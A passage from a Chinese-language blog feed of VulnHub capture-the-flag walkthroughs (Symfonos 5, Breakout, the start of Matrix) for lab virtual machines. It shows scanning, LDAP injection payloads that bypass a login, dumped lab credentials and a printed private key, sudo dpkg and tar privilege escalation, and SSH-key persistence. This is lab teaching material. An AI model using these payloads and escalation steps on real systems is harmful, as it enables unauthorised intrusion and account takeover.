class=\"line\">nH30fGkrBY14Db4MEF2WEIYCGbbD6FROxVoA39oXAeMRtC9VTbhgc5WiGjW8kadZgAyEvn</span><br><span class=\"line\">krfRtv9hDn1pyquiS7L8bAI+klJgulyuO8beLsNX0oMkw+RbAAAADBANxEmaC8oVnD8pRL</span><br><span class=\"line\">JfTzIIg7OI9g1gXPrT/ZlMgfxxlfQiWdQqoqmQfX4EthskAVwS3n9n7h4E5/4IOU+aLmn+</span><br><span class=\"line\">mrsx6aZhwVeF3bHLRfQmRqf6WBc58upcUrZqWPQ5hZfBzpDZFddixjhS0FU3rDlrEJJ9WL</span><br><span class=\"line\">R2D/q769sgV4dAXerLW643w3IKJA3liRQpBLrmcUHeN0VCbVfBVfrfz3lWN8vcikX2cSj</span><br><span class=\"line\">Vhp4jiMkroUJhEMm90N0rnAG/VfXiEXwAAAMEAz63xywZopECaqv8LSXlOAbLpNyKj/TQ</span><br><span class=\"line\">1XCOW9N3/DxE7swiSQmP35aoj3D2BmaaBIfTI+Jgxaoq8GUI/tSpgVVTVxQAHTByorVWLn</span><br><span class=\"line\">yDxM27xB4+20KVa8+LUbe7t3tK40cbzo6i4+0TCyM2M0Oxq2242c8jv1A9gMuSLT3B4Wj</span><br><span class=\"line\">fXSe1ypztVEyPr0LnB9khH9nyLe9IhChYAG6mPW31I0dnrtmy2UdMkOwscMuqKwpevijY</span><br><span class=\"line\">PJaNWLEHEcEcOTAAAACnJvb3RAZWFydGg=</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">&#x27; &gt;&gt; ~/.ssh/vulnhub</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-031.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用ssh私钥登录</span></span><br><span class=\"line\">chmod 700 ~/.ssh/vulnhub</span><br><span class=\"line\">ssh root@192.168.31.170 -i ~/.ssh/vulnhub</span><br></pre></td></tr></table></figure>\n<p>-&gt; 成功登陆到了对方服务器</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/106%20SYMFONOS/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/106%20SYMFONOS/",
            "title": "VULNHUB 6 SYMFONOS",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvc3ltZm9ub3MtNTIsNDE1Lw==\">https://www.vulnhub.com/entry/symfonos-52,415/</span><br>\n 教程链接地址 1：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAzLzAyL3Z1bG5odWItc3ltZm9ub3MtNS0yLw==\">https://readysetexploit.wordpress.com/2022/03/02/vulnhub-symfonos-5-2/</span><br>\n 教程链接地址 2：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FyeWFuZ3VlbnRobmVyL1Z1bG5odWItQ1RGLVdyaXRldXBz\">https://github.com/aryanguenthner/Vulnhub-CTF-Writeups</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-084.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP</li>\n</ol>\n<p><code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-085.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.81</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>sudo nmap -A -p 1-1024 192.168.31.81 -oN /tmp/symfonos.txt</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-086.png\" alt></p>\n<h3 id=\"gobuster-扫描目录\"><a class=\"markdownIt-Anchor\" href=\"#gobuster-扫描目录\">#</a> Gobuster 扫描目录</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODE=\">http://192.168.31.81</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-087.png\" alt></p>\n<ol>\n<li>目录扫描</li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-088.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvYWRtaW4ucGhw\">http://192.168.31.81/admin.php</span><br>\n<img data-src=\"/N1h1l157/VULNHUB/image-089.png\" alt></p>\n<p>尝试弱口令，注入等均无效</p>\n<ol start=\"2\">\n<li>加载字典，更详细的扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.81/ -w /usr/share/dirbuster/wordlists/directory-list-</span><br><span class=\"line\">2.3-medium.txt -x php,txt,html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-090.png\" alt></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvcG9ydHJhaXRzLnBocA==\">http://192.168.31.81/portraits.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-091.png\" alt></p>\n<h3 id=\"ldap-枚举\"><a class=\"markdownIt-Anchor\" href=\"#ldap-枚举\">#</a> LDAP 枚举</h3>\n<p>在 LDAP 上做一个快速枚举，看看是否有任何信息暴露给我们看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ldapsearch 使用</span></span><br><span class=\"line\">ldapsearch -h 192.168.31.81 -x -s namingcontexts</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-x Simple authentication</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-s scope one of base, one, sub or children (search scope)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-H URI LDAP Uniform Resource Identifier(s)</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-092.png\" alt></p>\n<p>-&gt; 关键信息: dn:namingContexts, dc=symfonos, dc=local</p>\n<h3 id=\"ldap-注入\"><a class=\"markdownIt-Anchor\" href=\"#ldap-注入\">#</a> LDAP 注入</h3>\n<p>考虑到 ldap 在这台机器上运行，可尝试用 ldap 注入登录框<br>\n ldap 注入 poc：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L3BlbnRlc3Rpbmctd2ViL2xkYXAtaW5qZWN0aW9u\">https://book.hacktricks.xyz/pentesting-web/ldap-injection</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-093.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">payload</span></span><br><span class=\"line\">(&amp;(user=*)(password=*))</span><br><span class=\"line\">(&amp;(user=*)(&amp;)(password=*)(&amp;))</span><br><span class=\"line\">(&amp;(user=*)(|(&amp;)(pass=pwd))</span><br></pre></td></tr></table></figure>\n<p>通过 user=* 和 password=* 登陆到了该站点</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-094.png\" alt></p>\n<p>发现了一个 ssrf 跨服务请求伪造:<br>\n<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuODEvaG9tZS5waHA/dXJsPWh0dHA6Ly8xOTIuMTY4LjMxLjgxL3BvcnRyYWl0cy5waHA=\">http://192.168.31.81/home.php?url=http://192.168.31.81/portraits.php</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-095.png\" alt></p>\n<p>分析在 http://192.168.31.81/admin.php 输入 user=*，pass=* 登陆成功的原因<br>\n我们必须记住，我们仍在处理 LDAP，当我们处理身份验证时，我们总是想检查页面是如何处理它的。在这种情况下，我们的目标是 admin.php 页面。</p>\n<p>我们认为 LFI\t有可能只是因为 URL\t与 localhost\t连接，以获取 Portraits.php 文件，利用 burpsuite 进行抓取 http://192.168.31.81/home.php?url admin.php 登陆时的数据包。</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-096.png\" alt></p>\n<p>-&gt; 用户名：admin 密码：qMDdyZh3cT6eeAWD，实际上用于连接 LDAP<br>\n <code>$bind = ldap_bind($ldap_ch, &quot;cn=admin,dc=symfonos,dc=local&quot;,&quot;qMDdyZh3cT6eeAWD&quot;);</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ldap信息枚举</span></span><br><span class=\"line\">ldapsearch -h 192.168.31.81 -D &quot;cn=admin,dc=symfonos,dc=local&quot; -w &#x27;qMDdyZh3cT6eeAWD&#x27; -x -b &quot;dc=symfonos,dc=local&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-D binddn <span class=\"built_in\">bind</span> DN</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-w passwd <span class=\"built_in\">bind</span> password (<span class=\"keyword\">for</span> simple authentication)</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-x Simple authentication</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">-b basedn base dn <span class=\"keyword\">for</span> search</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-097.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取到信息</span></span><br><span class=\"line\">admin e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=</span><br><span class=\"line\">zeus Y2V0a0tmNHdDdUhDOUZFVA==</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">base64</span> 解码：</span></span><br><span class=\"line\">echo &quot;Y2V0a0tmNHdDdUhDOUZFVA==&quot; | base64 -d</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\"><span class=\"built_in\">base64</span> 编码：</span></span><br><span class=\"line\">echo &quot;cetkKf4wCuHC9FET&quot; | base64</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-098.png\" alt></p>\n<p>-&gt; admin:{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm<br>\n-&gt; zeus:cetkKf4wCuHC9FET</p>\n<h3 id=\"dpkg-shell-提权\"><a class=\"markdownIt-Anchor\" href=\"#dpkg-shell-提权\">#</a> dpkg-shell 提权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登录靶机</span></span><br><span class=\"line\">ssh zeus@192.168.31.81 </span><br><span class=\"line\">cetkKf4wCuHC9FET</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-099.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看相关权限设置</span></span><br><span class=\"line\">sudo -l</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">发现dpkg拥有root权限，可通过dpkg提权</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">详细网址：https://gtfobins.github.io/gtfobins/dpkg/</span></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-100.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">输入以下命令：</span></span><br><span class=\"line\">sudo dpkg -l </span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在弹出来的交互式中继续输入!/bin/sh</span> </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-101.png\" alt></p>\n<h3 id=\"ssh-密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-密钥对维权\">#</a> SSH 密钥对维权</h3>\n<p>提前准备好配对好的私钥和公钥，将公钥发到靶机</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys &amp;&amp; rm - f ~/.ssh/id_rsa.pub</span><br><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-102.png\" alt></p>\n<p>-&gt; 免密成功，下次可直接登录</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/104%20BREAKOUT/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/104%20BREAKOUT/",
            "title": "VULNHUB 4 BREAKOUT",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZW1waXJlLWJyZWFrb3V0LDc1MS8=\">https://www.vulnhub.com/entry/empire-breakout,751/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9yZWFkeXNldGV4cGxvaXQud29yZHByZXNzLmNvbS8yMDIyLzAyLzIwL3Z1bG5odWItYnJlYWtvdXQv\">https://readysetexploit.wordpress.com/2022/02/20/vulnhub-breakout/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-046.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-047.png\" width=\"540\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.127</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.127 -oN /tmp/breakout.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-048.png\" width=\"500\" alt=\"Image\">\n<h3 id=\"brainfuck-解密\"><a class=\"markdownIt-Anchor\" href=\"#brainfuck-解密\">#</a> Brainfuck 解密</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTI3\">http://192.168.31.127</span></p>\n<ol>\n<li>对此网站进行目录扫描<br>\n <code>dirsearch -u http://192.168.31.127</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-049.png\" width=\"530\" alt=\"Image\">\n<p>审查源代码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">找到加密的密码如下：</span></span><br><span class=\"line\">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>brainfuck 加密<br>\n此为 brainfuck 加密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr\">https://ctf.bugku.com/tool/brainfuck</span></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-050.png\" alt></p>\n<p>-&gt; 某密码为  <code>.2uqPEfj3D&lt;P'a-3</code></p>\n<h3 id=\"smb-漏洞利用\"><a class=\"markdownIt-Anchor\" href=\"#smb-漏洞利用\">#</a> SMB 漏洞利用</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">smbclient 枚举</span></span><br><span class=\"line\">smbclient -N -L 192.168.31.127</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-051.png\" width=\"520\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">smbclient 测试</span></span><br><span class=\"line\">smbclient //192.168.31.127/IPC$ -N</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-052.png\" width=\"520\" alt=\"Image\">\n<p>Enum4linux 是用于枚举 windows 和 Linux 系统上的 SMB 服务的工具。可以轻松的从与 SMB 有关的目标中快速提取信息。通常可以确信，如果打开了端口 139 和 445 ，则 SMB 正在运行。使用 Enum4linux 收集信息我们需要做的第一件事是确定目标上是否存在 SMB。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用enum4linux 进行枚举SMB 信息</span></span><br><span class=\"line\">enum4linux -A 192.168.31.127</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-053.png\" alt></p>\n<p>-&gt; 得到一个用户名：cyber</p>\n<h3 id=\"tar-提权\"><a class=\"markdownIt-Anchor\" href=\"#tar-提权\">#</a> Tar 提权</h3>\n<ol>\n<li>登录服务器</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh cyber@192.168.31.127</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pass:.2uqPEfj3D&lt;P<span class=\"string\">&#x27;a-3</span></span></span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-054.png\" width=\"600\" alt=\"Image\">\n<ol start=\"2\">\n<li>找到一个敏感命令 tar 可以用调用 root 权限</li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-055.png\" width=\"420\" alt=\"Image\">\n<ol start=\"3\">\n<li>寻找敏感文件<br>\n <code>ls /var/backups/ -Alh</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-056.png\" width=\"440\" alt=\"Image\">\n<ol start=\"4\">\n<li>利用 tar 及备份文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用具有root权限的tar去压缩这个备份文件里边的密码:</span></span><br><span class=\"line\">./tar -zcvf pass.tar.gz /var/backups/.old_pass.bak</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">进行解压：</span></span><br><span class=\"line\">tar -zxvf pass.tar.gz</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看解压之后的文件：</span></span><br><span class=\"line\">cat ./var/backups/.old_pass.bak</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">密码显示为：</span></span><br><span class=\"line\">Ts&amp;4&amp;YurgtRX(=~h</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-057.png\" width=\"460\" alt=\"Image\">\n<h3 id=\"ssh-密钥对维权\"><a class=\"markdownIt-Anchor\" href=\"#ssh-密钥对维权\">#</a> SSH 密钥对维权</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">提前准备好配对好的私钥和公钥，将公钥发到靶机</span></span><br><span class=\"line\">scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/</span><br><span class=\"line\">cat ~/id_rsa.pub &gt;&gt; ~/authorized_keys</span><br><span class=\"line\">rm - f id_rsa.pub</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-058.png\" width=\"580\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">用私钥登录</span></span><br><span class=\"line\">ll | grep id</span><br><span class=\"line\">ssh root@192.168.31.127 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-059.png\" width=\"515\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "https://n1h1l157.github.io/2021/11/01/VULNHUB/108%20MATRIX/",
            "url": "https://n1h1l157.github.io/2021/11/01/VULNHUB/108%20MATRIX/",
            "title": "VULNHUB 8 MATRIX",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbWF0cml4LTEsMjU5Lw==\">https://www.vulnhub.com/entry/matrix-1,259/</span><br>\n 教程链接地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU4MzYzNy9hcnRpY2xlL2RldGFpbHMvMTAyODQ1ODYw\">https://blog.csdn.net/weixin_43583637/article/details/102845860</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 NAPPING：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>\n<p>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></p>\n</li>\n<li>\n<p>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</p>\n</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.107 --excludefile myip.txt</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-128.png\" alt></p>\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.107</p>\n<ol start=\"4\">\n<li>确认靶机 ip 开放的端口信息</li>\n</ol>\n<p><code>sudo nmap -A -p- 192.168.31.107 -oN /tmp/matrix.txt</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-129.png\" alt></p>\n<p>-&gt; 靶机开放端口 22, 80, 31337</p>\n<h3 id=\"80-网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#80-网站信息收集\">#</a> 80 网站信息收集</h3>\n<p>右键发现无法检查源代码，先扫一遍目录<br>\n <code>dirsearch -u http://192.168.31.107/</code></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-130.png\" alt></p>\n<p>-&gt; 敏感网址：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cw==\">http://192.168.31.107/assets</span><br>\n-&gt; 